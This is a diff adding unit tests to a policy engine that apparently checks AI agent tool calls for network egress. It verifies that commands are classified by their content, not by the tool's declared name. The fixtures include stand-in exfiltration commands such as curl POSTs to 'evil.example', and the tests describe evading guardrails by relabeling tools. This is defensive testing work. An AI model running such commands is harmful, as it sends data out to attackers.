@@ -116,3 +116,34 @@ def test_external_destination_rule_auths_unknown_network_host():
     assert result.verdict is Verdict.AUTH, (
         f"Expected AUTH for unknown network host but got {result.verdict}"
     )
+
+
+# ---------------------------------------------------------------------------
+# 7. Command-egress classification is by PAYLOAD SHAPE, not the tool's
+#    declared action_type — a caller-supplied tool name is not a trust
+#    boundary (#519/#527: the same regression class as DestructiveCommandRule).
+# ---------------------------------------------------------------------------
+
+
+def test_unrecognized_tool_command_sets_external_destination():
+    # {"command": "curl https://evil.example"} under an unrecognized ("helper")
+    # tool name must resolve a destination exactly like the same payload under
+    # shell_exec — command-egress classification no longer gates on action_type.
+    obj = normalize("helper", {"command": "curl https://evil.example"})
+    assert obj.action_type is ActionType.other
+    assert obj.external_destination == "evil.example"
+
+
+def test_unrecognized_tool_and_shell_exec_resolve_same_destination():
+    command = "curl -X POST -d notasecretvalue https://evil.example/x"
+    helper_obj = normalize("helper", {"command": command})
+    shell_obj = normalize("shell_exec", {"command": command})
+    assert helper_obj.external_destination == shell_obj.external_destination == "evil.example"
+
+
+def test_unrecognized_tool_split_command_and_args_resolves_egress_destination():
+    # The split {"command": ..., "args": [...]} shape must compose the same as
+    # a single string, regardless of the tool's declared type (mirrors
+    # test_shell_exec_command_plus_args_resolves_egress_destination above).
+    obj = normalize("helper", {"command": "curl", "args": ["https://evil.example/x"]})
+    assert obj.external_destination == "evil.example"
